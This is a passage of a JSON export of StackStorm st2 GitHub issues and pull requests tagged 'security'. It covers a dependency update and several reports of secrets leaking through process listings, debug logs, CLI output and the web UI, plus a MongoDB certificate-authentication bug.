                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6055",
                    "merged_at": "2023-11-03T20:32:52Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/6050",
                "title": "Update Orquesta to v1.6.0",
                "labels": [
                    "security",
                    "size/S"
                ],
                "user": "arm4b",
                "issue_author_association": "MEMBER",
                "number": 6050,
                "id": 1962273611,
                "state": "closed",
                "project_created_at": "2023-10-25T21:39:58Z",
                "closed_at": "2023-11-20T18:45:25Z",
                "body": "Update Orquesta to v1.6.0 to be included in the next st2 release.\r\nOrquesta v1.6.0 comes with some updated dependencies.\r\n",
                "comments": [
                    {
                        "body": "Yeah, I tried to go with updating `fixate-requirements.txt` script to support duplicate requirements with markers (for different python versions added in orquestra requirements.txt).\r\n\r\nBut went alternative way by unpinning the `networkx` in the st2 requirements, because the specific version is requested and installed by the `orquesta` dependencies here:  https://github.com/Stealthii/orquesta/blob/7dadd4cfa0e01a2fd65a545fbcdaad363bee4c68/requirements.txt#L5-L7\r\n```\r\nnetworkx>=2.5.1,<2.6; python_version < '3.7'\r\nnetworkx>=2.6,<3; python_version >= '3.7'\r\n```\r\n\r\nI'm getting what I want during the build stage:\r\n- U18 (py3.6): [networkx==2.5.1](https://app.circleci.com/pipelines/github/StackStorm/st2/4158/workflows/11838dac-5adc-4554-9a87-f7bf506bedb6/jobs/15940/parallel-runs/0?filterBy=ALL&invite=true#step-109-806306_65)\r\n- U20 (py3.8): [networkx==2.8.8](https://app.circleci.com/pipelines/github/StackStorm/st2/4158/workflows/11838dac-5adc-4554-9a87-f7bf506bedb6/jobs/15940/parallel-runs/1?filterBy=ALL&invite=true#step-109-806220_61)\r\n- EL8 (py3.8): [networkx==2.8.8](https://app.circleci.com/pipelines/github/StackStorm/st2/4158/workflows/11838dac-5adc-4554-9a87-f7bf506bedb6/jobs/15940/parallel-runs/1?filterBy=ALL&invite=true#step-109-806220_61)\r\n\r\nNow the only blocker is 🔴  `EL7` (py3.6) which is getting the `python_version` markers wrong (or ignoring them?) for some reason taking [this](https://github.com/Stealthii/orquesta/blob/7dadd4cfa0e01a2fd65a545fbcdaad363bee4c68/requirements.txt#L7) requirement line for `py3.8` instead:\r\nhttps://app.circleci.com/pipelines/github/StackStorm/st2/4158/workflows/11838dac-5adc-4554-9a87-f7bf506bedb6/jobs/15940?invite=true#step-109-929748_119\r\n```\r\n[package: st2] [18:59:09]      ERROR: pip's legacy dependency resolver does not consider dependency conflicts when selecting packages. This behaviour is the source of the following dependency conflicts.\r\n[package: st2] [18:59:09]      networkx 2.5.1 requires decorator<5,>=4.3, but you'll have decorator 5.1.1 which is incompatible.\r\nWRONG ----> [package: st2] [18:59:09]      orquesta 1.6.0 requires networkx<3,>=2.6, but you'll have networkx 2.5.1 which is incompatible.\r\n```\r\n\r\n\r\nI'm guessing something is outdated related to the build env for EL7 that doesn't quite work with dependency markers.\r\n@cognifloyd @nzlosh @amanda11  Any ideas to try?",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-10-26T19:24:37Z",
                        "url": "https://github.com/StackStorm/st2/pull/6050#issuecomment-1781768549"
                    },
                    {
                        "body": "Figured it out in https://github.com/StackStorm/st2-packages/pull/728, - which is RFR now (this PR relies on that st2-packages branch).\r\nNeed to fix e2e tests first before merging this, but this PR is RFR too.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-10-27T13:36:19Z",
                        "url": "https://github.com/StackStorm/st2/pull/6050#issuecomment-1782933536"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/6050",
                    "merged_at": "2023-11-20T18:45:25Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5997",
                "title": "secrets for python actions capturable in cleartext using ps -ef | grep action_wrapper",
                "labels": [
                    "bug",
                    "enhancement",
                    "security"
                ],
                "user": "fdrab",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5997,
                "id": 1802134602,
                "state": "open",
                "project_created_at": "2023-07-13T04:30:06Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n\r\nPython actions leak sensitive data when viewing processes\r\n\r\n### STACKSTORM VERSION\r\n\r\nst2 3.7.0, on Python 3.8.13\r\n\r\n##### OS, environment, install method\r\n\r\nRHEL8, instance and mongoDB running on the same DL360 Proliant wtih 16 core / 64G RAM configuration\r\n\r\n## Steps to reproduce the problem\r\n\r\ncreate sample flow:\r\n```\r\nname: secret_test\r\nrunner_type: python-script\r\ndescription: secrettest\r\nenabled: true\r\nentry_point: secret_test.py\r\nparameters:\r\n  secret:\r\n    type: string\r\n    description: sample_secret\r\n    required: false\r\n    position: 0\r\n    secret: true\r\n``` \r\n\r\n\r\n\r\nwith python script:\r\n```\r\nfrom st2common.runners.base_action import Action\r\nimport time\r\n\r\nclass SecretTest(Action):\r\n    def run(self, secret):\r\n        time.sleep(10)\r\n        return(True)\r\n```\r\n\r\n\r\nrun the flow and do ps -ef | grep action_wrapper:\r\n`[user@host ~]$ ps -ef | grep action_wrapper\r\nroot     1540283 1421574  1 06:17 ?        00:00:00 /opt/stackstorm/virtualenvs/testing/bin/python -u /opt/stackstorm/st2/lib/python3.8/site-packages/python_runner/python_action_wrapper.py --pack=testing --file-path=/opt/stackstorm/internal_packs/testing/actions/secret_test.py --user=fdrab --parent-args=[\"--config-file\",\"/etc/st2/st2.conf\"] --parameters={\"secret\":\"superSecretString\"} --log-level=INFO\r\nuser 1540289 1533819  0 06:17 pts/0    00:00:00 grep --color=auto action_wrapper\r\n[user@host ~]$`\r\n\r\nThis leads to secrets being printed to the screen and easily captured even by a non-root user or anyone using ps -ef | grep. Secret is still properly masked in UI and does not appear in the logs.\r\n\r\n## Expected Results\r\n\r\nI'd expect the secret parameters to be provided to the script in a secure way (even though I have no clue how).\r\n\r\n## Actual Results\r\n\r\nsecrets printed to console.",
                "comments": [
                    {
                        "body": "That's a good find!\r\n\r\nProbably not a bug, but a side effect of using CLI arguments as an input interface.\r\nIt's possible to do something with stdin as an implementation, but it will be not a CLI argument then as the idea is that you should be able to run the same python script with the same args outside of stackstorm.\r\n\r\nPerhaps it makes sense to document this side effect in the https://docs.stackstorm.com/reference/runners.html when CLI args are used.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-07-24T15:36:42Z",
                        "url": "https://github.com/StackStorm/st2/issues/5997#issuecomment-1648153437"
                    },
                    {
                        "body": ">the idea is that you should be able to run the same python script with the same args outside of stackstorm\r\n\r\nI would understand this for some scripts, where you convert already existing scripts and adapt them to ST2, but many of the scripts I'm creating are exclusively to be used in the context of ST2 and use st2 client, or for example the SQL pack (or any pack that allows password to be an input) on stackstorm-exchange. Maybe I can work around this by using K8s, where the individual processes run in pods and hopefully what happens in pods is not capturable in trivial way such as ps -ef. \r\nOr I'll rewrite all python actions to simply not use passwords as inputs at all and instead the process would be to pre-store a password / token in the datastore as encrypted value and then fetch the value via action_service.get instead of secrets being provided as CLI params. ",
                        "user": "fdrab",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2023-07-26T06:49:00Z",
                        "url": "https://github.com/StackStorm/st2/issues/5997#issuecomment-1651079601"
                    },
                    {
                        "body": "> Maybe I can work around this by using K8s, where the individual processes run in pods\r\n\r\nI think it could be worse in K8s considering amount of potential neighbours in the cluster and higher blast radius in case of something goes wrong. Add here different logging and metrics K8s capabilities that might read the process list.\r\n\r\n----\r\n\r\nYeah, I agree.\r\n\r\nCLI args should still apply to `local-shell-script`, `local-shell-cmd` and similar shell/scrips runners. And so one can convert a script.py with CLI args to an action this way.\r\n\r\nHowever considering deeper python logic of `python-script` actions implemented as Python classes with a run() method, it should ideally rely on stackstorm primitives for passing secrets. Agree 💯 on that.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-07-26T14:29:27Z",
                        "url": "https://github.com/StackStorm/st2/issues/5997#issuecomment-1651922568"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5977",
                "title": "St2 auth logs leak sensitive information",
                "labels": [
                    "bug",
                    "help wanted",
                    "security"
                ],
                "user": "nzlosh",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5977,
                "id": 1708518145,
                "state": "closed",
                "project_created_at": "2023-05-13T08:34:32Z",
                "closed_at": "2023-10-05T20:16:48Z",
                "body": "## SUMMARY\r\n\r\nSt2 writes http requests with unsanitised username/password pair to `st2.auth.log` when log level set to ``DEBUG``.\r\n\r\n### STACKSTORM VERSION\r\n\r\n``st2 3.8.0, on Python 3.6.9``\r\n\r\n##### OS, environment, install method\r\n```\r\nlsb_release -a\r\nNo LSB modules are available.\r\nDistributor ID: Ubuntu\r\nDescription:    Ubuntu 18.04.6 LTS\r\nRelease:        18.04\r\nCodename:       bionic\r\n```\r\n\r\n**Install method:** manual (https://docs.stackstorm.com/install/u18.html)\r\n\r\n## Steps to reproduce the problem\r\n\r\n1. Configure ``st2.conf`` auth section using LDAP backend\r\n```\r\n[auth]\r\nhost = 127.0.0.1\r\nport = 9100\r\nuse_ssl = False\r\ndebug = True\r\nenable = True\r\nlogging = /etc/st2/logging.auth.conf\r\n\r\nmode = standalone\r\nbackend = ldap\r\nbackend_kwargs = { \"bind_dn\": \"cn=st2,dc=example,dc=net\", \"bind_password\": \"xxxx\", \"base_ou\": \"dc=example,dc=com\", \"group_dns\": [\"cn=stackstorm users\", \"cn=stackstorm admins\"], \"host\": \"localhost\", \"port\": 389, \"use_ssl\": false }\r\n```\r\n\r\n2. Login via st2 cli\r\n```st2 auth st2admin -t```\r\n\r\n3. Review log entries in ``st2.auth.log``\r\n\r\nLogged http request contains Authorization header with username/password.\r\n```\r\n2023-05-13 09:52:17,208 140432424245856 DEBUG router [-] Received call with WebOb: POST /tokens HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Basic c3QyYWRtaW46TGVha2VkUGFzc3dvcmQK\r\nConnection: keep-alive\r\nContent-Length: 2\r\nContent-Type: application/json\r\nHost: 127.0.0.1:9100\r\nUser-Agent: python-requests/2.25.1\r\nX-Request-Id: 52ad53f1-9942-4b31-95c6-cb12e442f77a\r\n\r\n{}\r\n```\r\n``Authorization`` is plain text base64 encoded: ``base64 -d <<<c3QyYWRtaW46TGVha2VkUGFzc3dvcmQK\r\nst2admin:LeakedPassword``\r\n\r\n## Expected Results\r\n\r\nIn order of preference:\r\n1. remove/obfuscate the ``Authorization` header\r\n2. don't log the request, just the call url.\r\n\r\n## Actual Results\r\n\r\nAuthentication secrets leaked in plain text through logs.",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5924",
                "title": "\"st2 key load secrets.yaml\" prints out secret values to terminal when ran.",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "jonthemango",
                "issue_author_association": "NONE",
                "number": 5924,
                "id": 1617521032,
                "state": "open",
                "project_created_at": "2023-03-09T15:55:52Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n`st2 key load` will log secrets to the terminal unlike `st2 key set -e` which encrypts then logs them to the terminal.\r\n\r\n### STACKSTORM VERSION\r\n\r\nPaste the output of ``st2 --version``:\r\n`st2 3.8.0, on Python 3.8.16`\r\n\r\n##### OS, environment, install method\r\n- Ubuntu \r\n- Ansible Playbooks https://docs.stackstorm.com/install/ansible.html \r\n\r\n## Steps to reproduce the problem\r\n\r\nGiven that a file secrets.yaml exists on the client machine:\r\n```yaml\r\n---\r\n- name: api_token\r\n  value: SECRET_TOKEN  # cleartext\r\n  secret: true  # will be stored encrypted\r\n```\r\n\r\nWhen running `st2 key load secrets.yaml` the contents of the secret variables will be logged to the console in plain text. \r\n\r\nThis is unlike `st2 key set -e api_token $api_token` which logs the encrypted value of api_token.\r\n\r\nFor doing deployments of variables to the key store in CI/CD environments this can lead to secret leakage.\r\n\r\n## Expected Results\r\nst2 key load secrets.yaml encrypts the secrets and prints the encrypted value.\r\n\r\n## Actual Results\r\nst2 key load secrets.yaml displays secrets in plain text.\r\n",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5809",
                "title": "The secrets are shown in plain text in Rules/Enforcements tab on WebUI",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "yypptest",
                "issue_author_association": "NONE",
                "number": 5809,
                "id": 1450797411,
                "state": "open",
                "project_created_at": "2022-11-16T03:52:45Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n\r\nThe action parameter with `secret: true` is shown in plain text on Rules/Enforcements section on WebUI\r\n\r\n### STACKSTORM VERSION\r\nst2 3.7.0, on Python 3.8.12\r\n\r\n##### OS, environment, install method\r\nRedHat 8.6 \r\n\r\n## Steps to reproduce the problem\r\n\r\n```\r\n---\r\nname: full_backup\r\npack: mongodb\r\nenabled: true\r\ndescription: Performs a backup of MongoDB\r\nrunner_type: orquesta\r\nentry_point: workflows/full_backup.yaml\r\nparameters:\r\n  mongodb_password:\r\n    default: \"{{ st2kv.system.mongodb_admin_password | decrypt_kv }}\"\r\n    type: string\r\n    secret: true\r\n```\r\n\r\n```\r\n---\r\nname: mongodb_backup_cron\r\npack: backups\r\ndescription: \"Executes a mongodb backup on a cron schedule.\"\r\nenabled: true\r\n\r\ntrigger:\r\n  type: \"core.st2.CronTimer\"\r\n  # http://apscheduler.readthedocs.io/en/3.0/modules/triggers/cron.html#api\r\n  parameters:\r\n      timezone: \"UTC\"\r\n      day_of_week: \"*\"\r\n      hour: 1\r\n      minute: 0\r\n      second: 0\r\n  \r\naction:\r\n  ref: \"backups.mongodb_backup\"\r\n```\r\n## Expected Results\r\n\r\nThe parameter `mongodb_password` should be masked on Web UI  in Rules/Enforcements tab, no plain text should be displayed\r\n\r\n## Actual Results\r\n\r\nThe parameter `mongodb_password` is shown in plain text in `Action input` in the Rules/Enforcements tab on Web UI ",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5804",
                "title": "st2-api-key not obfuscated when using core.http?",
                "labels": [
                    "bug",
                    "help wanted",
                    "good first issue",
                    "security"
                ],
                "user": "fdrab",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5804,
                "id": 1448185718,
                "state": "open",
                "project_created_at": "2022-11-14T14:35:32Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n\r\nI have 2 ST2 instances (independent of each other and in different networks) and want them to communicate with each other via API using API keys. However, when providing st2-api-key to headers of action core.http, the API key is visible in plain-text in both st2web and in CLI. This is not desirable, as I want the users to be able to use the keys, but not unintentionally share them during any screen sharing sessions. Masking is set in the config for both [api] and [log] (and any actions I've created that use the \"secret\" tag are masked properly) in st2.conf and I've even tried adding st2-api-key into mask_secrets_blacklist. I've tried to clone the runner, but headers are not overridable (can't just create my own http runner with headers marked as \"secret\"). Before going on and writing my own http as a python action, I wanted to ask whether I'm doing something wrong, as it seems obvious to me that any auth info should be obfuscated by default.\r\n\r\n### STACKSTORM VERSION\r\n\r\n[root@st2 st2]# st2 --version\r\nst2 3.7.0, on Python 3.8.12\r\n[root@st2 st2]#\r\n\r\n\r\n##### OS, environment, install method\r\n\r\ncustom install on a RHEL8\r\n\r\n## Steps to reproduce the problem\r\n\r\nUse core.http with st2-api-key: <value> in st2web.\r\n\r\n## Expected Results\r\n\r\nExpected the value of the API key to be obfuscated.\r\n\r\n## Actual Results\r\n\r\nThe API key is visible in plaintext.\r\n\r\nMaking sure to follow these steps will guarantee the quickest resolution possible.\r\n\r\nThanks!\r\n",
                "comments": [
                    {
                        "body": "Looking at some logging tests here:\r\nhttps://github.com/StackStorm/st2/blob/007beed8325b397d540d97905af8f2edb14b925f/st2common/tests/unit/test_logging_middleware.py#L51\r\nhttps://github.com/StackStorm/st2/blob/007beed8325b397d540d97905af8f2edb14b925f/st2common/tests/unit/test_logging_middleware.py#L60-L70\r\n\r\nthe api key is expected to be hidden, at least in the logs.\r\n\r\nYes, that sounds like a bug if the st2-api-key is visible to you.\r\n\r\n\r\nWe'd welcome PRs to fix this issue.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-15T13:10:18Z",
                        "url": "https://github.com/StackStorm/st2/issues/5804#issuecomment-1315290936"
                    },
                    {
                        "body": "This is semi-correctly (I think) masked in the logs:\r\n`2022-11-16 08:11:20,487 139745041997888 INFO base [-] Dispatching Action to a runner (liveaction_db={'action': 'core.http', 'action_is_workflow': False, 'callback': {}, 'context': {'pack': 'core', 'user': 'fdrab', 'parent': {'execution_id': '63748d17adef072e5e7dac26', 'user': 'fdrab', 'pack': 'default'}, 'orquesta': {'workflow_execution_id': '63748d183955820df1d12eb1', 'task_execution_id': '63748d18837eb7ca8787d46b', 'task_name': 'task1', 'task_id': 'task1', 'task_route': 0}}, 'delay': None, 'end_timestamp': None, 'id': '63748d18837eb7ca8787d46d', 'notify': None, 'parameters': {'headers': {'st2-api-key': '********'}, 'url'`\r\n\r\nI say semi-correctly, because if (taken from your post above) st2_auth_token as well as x-auth-token should be masked in the logs, it works at 50% (perhaps there's a provision that only first value is masked, or I can't use both st2_auth_token and x-auth-token?):\r\n`2022-11-16 08:40:14,604 139991129925056 INFO base [-] Dispatching Action to a runner (liveaction_db={'action': 'core.http', 'action_is_workflow': False, 'callback': {}, 'context': {'trace_context': {}, 'user': 'fdrab', 'pack': 'core'}, 'delay': None, 'end_timestamp': None, 'id': '637493deadef072e5e7dac28', 'notify': None, 'parameters': {'headers': {'x-auth-token': 'sometoken', 'st2_auth_token': '********'}, 'url'`\r\n\r\nin the UI post-execution I can see both values in cleartext as {\"x-auth-token\":\"sometoken\",\"st2_auth_token\":\"sometoken\"}",
                        "user": "fdrab",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-16T13:16:39Z",
                        "url": "https://github.com/StackStorm/st2/issues/5804#issuecomment-1317005629"
                    },
                    {
                        "body": "https://docs.stackstorm.com/reference/secrets_masking.html\r\nBased on that, sounds like the secrets masking for that specific `st2_auth_token` works semi-correctly in the logs, but fails in the API responses.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-16T23:07:51Z",
                        "url": "https://github.com/StackStorm/st2/issues/5804#issuecomment-1317796480"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5759",
                "title": "MongoDB Certificate Authentication",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "bishopbm1",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5759,
                "id": 1398235396,
                "state": "open",
                "project_created_at": "2022-10-05T19:02:44Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n\r\nMongoDB Certificate authentication seems to be broken. The core issue seems to be that with MongoDB 4.0 and greater you have to explicitly pass the following params:\r\n```\r\nauthSource='$external',\r\nauthMechanism='MONGODB-X509'\r\n```\r\n\r\nWe have the ability to pass `authentication_mechanism` from the config but the auth source is missing.\r\n\r\nLooking into the code a bit i think other values need updated due to deprecations.\r\nhttps://github.com/mongodb/mongo-python-driver/blob/78476d0217289e5a3fafb5c599a8a88558d87d92/pymongo/mongo_client.py#L559-L584\r\n\r\n```\r\n- ``ssl_certfile`` and ``ssl_keyfile`` were deprecated in favor\r\n               of ``tlsCertificateKeyFile``.\r\n- ``ssl_cert_reqs`` was deprecated in favor of\r\n               ``tlsAllowInvalidCertificates``.\r\n- ``ssl_match_hostname`` was deprecated in favor of\r\n ``tlsAllowInvalidHostnames``.\r\n- ``ssl_ca_certs`` was deprecated in favor of ``tlsCAFile``.\r\n- ``ssl_certfile`` was deprecated in favor of\r\n ``tlsCertificateKeyFile``.\r\n- ``ssl_crlfile`` was deprecated in favor of ``tlsCRLFile``.\r\n- ``ssl_pem_passphrase`` was deprecated in favor of\r\n ``tlsCertificateKeyFilePassword``.\r\n```\r\n\r\nDirectly using the same modules we use i was able to connect to the DB using certificate authentication using the following code:\r\n```\r\nssl_kwargs = {\r\n    'ssl': True,\r\n    'tlsCertificateKeyFile': '/etc/st2/mongo_certs/client.pem',\r\n    'tlsCAFile': '/etc/st2/mongo_certs/ca.pem',\r\n    'tlsAllowInvalidHostnames': True,\r\n    'tlsAllowInvalidCertificates': True,\r\n    'authSource': '$external',\r\n    'authMechanism': 'MONGODB-X509'\r\n}\r\nconnection = mongoengine.connection.connect(\r\n    'st2',\r\n    host='127.0.0.1',\r\n    port=27017,\r\n    tz_aware=True,\r\n    username=None,\r\n    password=None,\r\n    connectTimeoutMS=3000,\r\n    serverSelectionTimeoutMS=3000,\r\n    **ssl_kwargs\r\n)\r\n```\r\n\r\n### STACKSTORM VERSION\r\n\r\n```\r\n# st2 --version\r\nst2 3.7.0, on Python 3.8.12\r\n\r\n# cat /etc/*release\r\nNAME=\"Red Hat Enterprise Linux\"\r\nVERSION=\"8.6 (Ootpa)\"\r\nID=\"rhel\"\r\nID_LIKE=\"fedora\"\r\nVERSION_ID=\"8.6\"\r\nPLATFORM_ID=\"platform:el8\"\r\nPRETTY_NAME=\"Red Hat Enterprise Linux 8.6 (Ootpa)\"\r\nANSI_COLOR=\"0;31\"\r\nCPE_NAME=\"cpe:/o:redhat:enterprise_linux:8::baseos\"\r\nHOME_URL=\"https://www.redhat.com/\"\r\nDOCUMENTATION_URL=\"https://access.redhat.com/documentation/red_hat_enterprise_linux/8/\"\r\nBUG_REPORT_URL=\"https://bugzilla.redhat.com/\"\r\n\r\nREDHAT_BUGZILLA_PRODUCT=\"Red Hat Enterprise Linux 8\"\r\nREDHAT_BUGZILLA_PRODUCT_VERSION=8.6\r\nREDHAT_SUPPORT_PRODUCT=\"Red Hat Enterprise Linux\"\r\nREDHAT_SUPPORT_PRODUCT_VERSION=\"8.6\"\r\nRed Hat Enterprise Linux release 8.6 (Ootpa)\r\nRed Hat Enterprise Linux release 8.6 (Ootpa)\r\n\r\n\r\nMongoDB server version: 4.0.28\r\n```\r\n\r\n## Steps to reproduce:\r\n/etc/mongo.conf\r\n```\r\n# mongod.conf\r\n\r\n# for documentation of all options, see:\r\n#   http://docs.mongodb.org/manual/reference/configuration-options/\r\n\r\n# where to write logging data.\r\nsystemLog:\r\n  destination: file\r\n  logAppend: true\r\n  path: /var/log/mongodb/mongod.log\r\n\r\n# Where and how to store data.\r\nstorage:\r\n  dbPath: /var/lib/mongo\r\n  journal:\r\n    enabled: true\r\n#  engine:\r\n#  mmapv1:\r\n#  wiredTiger:\r\n\r\n# how the process runs\r\nprocessManagement:\r\n  fork: true  # fork and run in background\r\n  pidFilePath: /var/run/mongodb/mongod.pid  # location of pidfile\r\n  timeZoneInfo: /usr/share/zoneinfo\r\n\r\n# network interfaces\r\nnet:\r\n  port: 27017\r\n  bindIp: 127.0.0.1\r\n  ssl:\r\n    mode: requireSSL\r\n    PEMKeyFile: /var/lib/mongo/certs/mongo.pem\r\n    CAFile: /var/lib/mongo/certs/ca.pem\r\n    allowInvalidCertificates: true\r\n\r\n#security:\r\n\r\n#operationProfiling:\r\n\r\n#replication:\r\n\r\n#sharding:\r\n\r\n## Enterprise-Only Options\r\n\r\n#auditLog:\r\n\r\n#snmp:\r\nsecurity:\r\n  authorization: enabled\r\n```\r\n\r\n/etc/st2/st2.conf\r\n```\r\n[database]\r\nssl = True\r\nssl_ca_certs = /etc/st2/mongo_certs/ca.pem\r\nssl_certfile = /etc/st2/mongo_certs/client-signed.crt\r\nssl_keyfile = /etc/st2/mongo_certs/client.key\r\nssl_cert_reqs = required\r\nssl_match_hostname = False\r\nauthentication_mechanism = MONGODB-X509\r\n```\r\n\r\nerror:\r\n```\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,040 INFO [-] Using Python: 3.8.12 (/opt/stackstorm/st2/bin/python)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,040 INFO [-] Using fs encoding: utf-8, default encoding: utf-8, locale: en_US.UTF-8, LANG env variable: en_US.UTF-8, PYTHONIOENCODING env variable: notset\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,040 INFO [-] Using config files: /etc/st2/st2.conf\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,040 INFO [-] Using logging config: /etc/st2/logging.sensorcontainer.conf\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,041 INFO [-] Using coordination driver: redis\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,041 INFO [-] Using metrics driver: noop\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,090 INFO [-] Connecting to database \"st2\" @ \"127.0.0.1:27017\" as user \"None\".\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,325 INFO [-] Successfully connected to database \"st2\" @ \"127.0.0.1:27017\" as user \"None\".\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,357 ERROR [-] (PID:1401793) SensorContainer quit due to exception.\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: Traceback (most recent call last):\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2reactor/cmd/sensormanager.py\", line 66, in main\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    _setup()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2reactor/cmd/sensormanager.py\", line 48, in _setup\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    common_setup(\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/service_setup.py\", line 252, in setup\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    db_setup()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/database_setup.py\", line 55, in db_setup\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    connection = db_init.db_setup_with_retry(**db_cfg)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/persistence/db_init.py\", line 79, in db_setup_with_retry\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return db_func_with_retry(\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/persistence/db_init.py\", line 58, in db_func_with_retry\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return retrying_obj.call(db_func, *args, **kwargs)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/retrying.py\", line 206, in call\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return attempt.get(self._wrap_exception)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/retrying.py\", line 247, in get\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    six.reraise(self.value[0], self.value[1], self.value[2])\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/six.py\", line 696, in reraise\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    raise value\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/retrying.py\", line 200, in call\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    attempt = Attempt(fn(*args, **kwargs), attempt_number, False)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/models/db/__init__.py\", line 257, in db_setup\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    db_ensure_indexes()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/models/db/__init__.py\", line 298, in db_ensure_indexes\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    raise e\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/models/db/__init__.py\", line 287, in db_ensure_indexes\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    model_class.ensure_indexes()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/mongoengine/document.py\", line 867, in ensure_indexes\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    collection = cls._get_collection()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/mongoengine/document.py\", line 215, in _get_collection\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    cls.ensure_indexes()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/mongoengine/document.py\", line 894, in ensure_indexes\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    collection.create_index(fields, background=background, 